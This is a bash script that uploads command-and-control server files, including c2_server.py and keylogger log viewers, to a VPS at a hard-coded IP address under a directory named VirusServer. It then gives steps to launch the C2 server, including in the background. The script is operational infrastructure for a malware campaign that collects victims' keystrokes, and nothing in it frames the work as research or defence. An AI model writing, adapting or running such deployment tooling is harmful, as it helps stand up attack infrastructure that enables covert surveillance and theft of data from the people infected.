#!/bin/bash
# Script to upload C2 server files to VPS
# Usage: ./upload_to_server.sh [server_user@server_ip]

SERVER="${1:-root@103.75.183.125}"
SERVER_DIR="~/VirusServer"

echo "============================================================"
echo "📤 UPLOADING C2 SERVER FILES TO VPS"
echo "============================================================"
echo "Server: $SERVER"
echo "Directory: $SERVER_DIR"
echo ""

# Required files
REQUIRED_FILES=(
    "c2_server.py"
)

# Recommended files
RECOMMENDED_FILES=(
    "view_keyboard_logs.sh"
    "check_keylogger_on_server.sh"
    "view_server_data.py"
)

# Optional files
OPTIONAL_FILES=(
    "C2_SERVER_SETUP.md"
    "SERVER_FILES.md"
)

echo "📋 Files to upload:"
echo ""
echo "✅ REQUIRED:"
for file in "${REQUIRED_FILES[@]}"; do
    if [ -f "$file" ]; then
        echo "   - $file"
    else
        echo "   ❌ $file (NOT FOUND!)"
    fi
done

echo ""
echo "⭐ RECOMMENDED:"
for file in "${RECOMMENDED_FILES[@]}"; do
    if [ -f "$file" ]; then
        echo "   - $file"
    else
        echo "   ⚠️  $file (not found, skipping)"
    fi
done

echo ""
echo "📖 OPTIONAL:"
for file in "${OPTIONAL_FILES[@]}"; do
    if [ -f "$file" ]; then
        echo "   - $file"
    else
        echo "   ⚠️  $file (not found, skipping)"
    fi
done

echo ""
read -p "Continue upload? (y/n) " -n 1 -r
echo ""
if [[ ! $REPLY =~ ^[Yy]$ ]]; then
    echo "❌ Upload cancelled"
    exit 1
fi

echo ""
echo "📤 Uploading files..."

# Create directory on server
echo "Creating directory on server..."
ssh "$SERVER" "mkdir -p $SERVER_DIR" || {
    echo "❌ Failed to create directory on server"
    exit 1
}

# Upload required files
echo ""
echo "Uploading REQUIRED files..."
for file in "${REQUIRED_FILES[@]}"; do
    if [ -f "$file" ]; then
        echo "  📤 $file..."
        scp "$file" "$SERVER:$SERVER_DIR/" || {
            echo "  ❌ Failed to upload $file"
            exit 1
        }
    else
        echo "  ❌ $file not found - REQUIRED FILE MISSING!"
        exit 1
    fi
done

# Upload recommended files
echo ""
echo "Uploading RECOMMENDED files..."
for file in "${RECOMMENDED_FILES[@]}"; do
    if [ -f "$file" ]; then
        echo "  📤 $file..."
        scp "$file" "$SERVER:$SERVER_DIR/" || {
            echo "  ⚠️  Failed to upload $file (non-critical)"
        }
    fi
done

# Upload optional files
echo ""
echo "Uploading OPTIONAL files..."
for file in "${OPTIONAL_FILES[@]}"; do
    if [ -f "$file" ]; then
        echo "  📤 $file..."
        scp "$file" "$SERVER:$SERVER_DIR/" || {
            echo "  ⚠️  Failed to upload $file (non-critical)"
        }
    fi
done

# Make scripts executable
echo ""
echo "Making scripts executable..."
ssh "$SERVER" "cd $SERVER_DIR && chmod +x *.sh 2>/dev/null" || {
    echo "  ⚠️  Failed to make scripts executable (non-critical)"
}

echo ""
echo "============================================================"
echo "✅ UPLOAD COMPLETE!"
echo "============================================================"
echo ""
echo "Next steps on server:"
echo "  1. SSH to server: ssh $SERVER"
echo "  2. Go to directory: cd $SERVER_DIR"
echo "  3. Configure C2_KEY in c2_server.py (if needed)"
echo "  4. Run server: python3 c2_server.py"
echo ""
echo "Or run in background:"
echo "  nohup python3 c2_server.py > c2_server.log 2>&1 &"
echo "============================================================"

